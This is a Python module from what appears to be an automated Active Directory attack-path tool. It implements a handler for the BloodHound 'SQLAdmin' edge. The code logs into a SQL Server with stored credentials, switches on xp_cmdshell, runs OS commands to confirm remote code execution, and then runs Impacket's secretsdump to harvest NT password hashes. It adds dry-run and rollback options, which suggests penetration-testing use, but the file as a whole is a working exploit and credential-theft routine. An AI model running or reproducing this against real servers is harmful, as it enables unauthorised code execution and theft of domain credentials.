"""SQL Server administration handler for linked-server exploitation.

Exploits the ``SQLAdmin`` BloodHound edge.  When the source principal
has ``sysadmin`` privileges on a SQL Server instance, this handler
connects via Impacket's ``mssqlclient.py`` and executes operating system
commands through ``xp_cmdshell``.

Attack flow:
    1. Verify ``mssqlclient.py`` is on PATH and credentials exist.
    2. Connect to the SQL Server via ``mssqlclient.py``.
    3. Enable ``xp_cmdshell`` if it is not already enabled.
    4. Execute ``whoami`` to confirm remote code execution.
    5. Optionally dump credentials via secretsdump.

Rollback:
    Disable ``xp_cmdshell`` if we enabled it during exploitation.
"""

from __future__ import annotations

import shutil

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import impacket_wrapper as impacket


@register_handler("SQLAdmin")
class SQLAdminHandler(BaseEdgeHandler):
    """Exploit ``SQLAdmin`` edges via ``mssqlclient.py`` and ``xp_cmdshell``.

    The source principal has sysadmin privileges on a SQL Server target.
    We leverage ``mssqlclient.py`` to enable ``xp_cmdshell`` and execute
    OS-level commands on the underlying server.
    """

    # Track whether we enabled xp_cmdshell (for rollback)
    _enabled_xp_cmdshell: bool = False
    _sql_target: str | None = None

    # ------------------------------------------------------------------
    # Prerequisites
    # ------------------------------------------------------------------

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        """Verify mssqlclient.py is available and credentials exist.

        Args:
            edge: The ``SQLAdmin`` edge to evaluate.

        Returns:
            ``(ok, message)`` tuple.
        """
        if not shutil.which("mssqlclient.py"):
            return (
                False,
                "mssqlclient.py not found on PATH. "
                "Install via: pip install impacket",
            )

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)

        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (
                    False,
                    f"No credentials available for '{source_user}'. "
                    "Cannot authenticate to SQL Server.",
                )

        target = self._resolve_target(edge)
        return (
            True,
            f"Ready for SQLAdmin exploitation: {source_user} has "
            f"sysadmin on SQL Server {target}.",
        )

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    async def exploit(
        self,
        edge: EdgeInfo,
        dry_run: bool = False,
    ) -> tuple[bool, str, list[Credential]]:
        """Connect to SQL Server, enable xp_cmdshell, and execute commands.

        Args:
            edge: The ``SQLAdmin`` edge.
            dry_run: If ``True``, log the planned actions without executing them.

        Returns:
            ``(success, message, new_credentials)`` tuple.
        """
        source_user = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        domain = self._get_domain()
        dc_host = self._get_dc_host()

        # SQL Server target may have a specific IP in edge properties
        sql_host = edge.target.properties.get("ip_address") or target
        sql_port = edge.target.properties.get("port", "1433")
        self._sql_target = f"{sql_host}:{sql_port}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would connect to SQL Server {self._sql_target} as "
                f"'{source_user}', enable xp_cmdshell, and execute whoami.",
                [],
            )

        new_creds: list[Credential] = []

        # Build Impacket auth
        _target_str, auth_flags = self._get_impacket_auth(source_user)

        cred = self.cred_store.get_best_credential(source_user, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        # Step 1: Enable xp_cmdshell
        self.logger.info(
            "SQLAdmin Step 1: Enabling xp_cmdshell on %s", self._sql_target,
        )
        enable_cmd = (
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        )
        enable_result = await impacket.mssqlclient(
            target=sql_host,
            command=enable_cmd,
            auth_args=auth_flags,
            domain=domain,
            username=source_user,
            password=password,
            nt_hash=nt_hash,
            timeout=30,
        )

        if enable_result["success"]:
            self._enabled_xp_cmdshell = True
            self.logger.info("xp_cmdshell enabled successfully.")
        else:
            # xp_cmdshell might already be enabled, try proceeding
            self.logger.warning(
                "xp_cmdshell enable command returned error (may already be enabled): %s",
                enable_result.get("error", "unknown"),
            )

        # Step 2: Execute whoami to confirm RCE
        self.logger.info(
            "SQLAdmin Step 2: Executing 'whoami' via xp_cmdshell on %s",
            self._sql_target,
        )
        whoami_cmd = "EXEC xp_cmdshell 'whoami';"
        whoami_result = await impacket.mssqlclient(
            target=sql_host,
            command=whoami_cmd,
            auth_args=auth_flags,
            domain=domain,
            username=source_user,
            password=password,
            nt_hash=nt_hash,
            timeout=30,
        )

        if not whoami_result["success"]:
            return (
                False,
                f"xp_cmdshell execution failed on {self._sql_target}: "
                f"{whoami_result.get('error', 'unknown')}",
                [],
            )

        rce_user = whoami_result.get("output", "").strip()
        self.logger.info(
            "RCE confirmed on %s as '%s'", self._sql_target, rce_user,
        )

        # Step 3: Optionally attempt credential extraction via secretsdump
        # Only if we have direct network access to the SQL server for SMB
        self.logger.info(
            "SQLAdmin Step 3: Attempting credential extraction from %s",
            sql_host,
        )
        dump_result = await impacket.secretsdump(
            target=sql_host,
            auth_args=auth_flags,
            domain=domain,
            username=source_user,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_host,
            just_dc=False,
            timeout=120,
        )

        if dump_result["success"]:
            hashes: dict[str, str] = dump_result.get("hashes", {})
            for user, nt in hashes.items():
                new_creds.append(
                    Credential(
                        cred_type=CredentialType.nt_hash,
                        value=nt,
                        username=user,
                        domain=domain,
                        obtained_from=f"secretsdump via SQLAdmin on {self._sql_target}",
                    )
                )
            self.logger.info(
                "Extracted %d credential hashes from %s", len(hashes), sql_host,
            )
        else:
            self.logger.warning(
                "secretsdump against %s failed (non-fatal): %s",
                sql_host, dump_result.get("error", "unknown"),
            )

        msg_parts = [
            f"SQLAdmin exploitation on {self._sql_target}: RCE confirmed as '{rce_user}'.",
        ]
        if new_creds:
            msg_parts.append(f"Extracted {len(new_creds)} credential hashes.")

        return (True, " ".join(msg_parts), new_creds)

    # ------------------------------------------------------------------
    # Rollback
    # ------------------------------------------------------------------

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        """Disable xp_cmdshell if we enabled it.

        Args:
            edge: The ``SQLAdmin`` edge.

        Returns:
            A :class:`RollbackAction` to disable xp_cmdshell, or ``None``
            if we did not enable it.
        """
        if not self._enabled_xp_cmdshell:
            return None

        target = self._sql_target or self._resolve_target(edge)
        return RollbackAction(
            step_index=0,
            action_type="disable_xp_cmdshell",
            description=f"Disable xp_cmdshell on SQL Server {target}",
            command=(
                f"mssqlclient.py -windows-auth -q "
                f"\"EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\""
            ),
            reversible=True,
        )
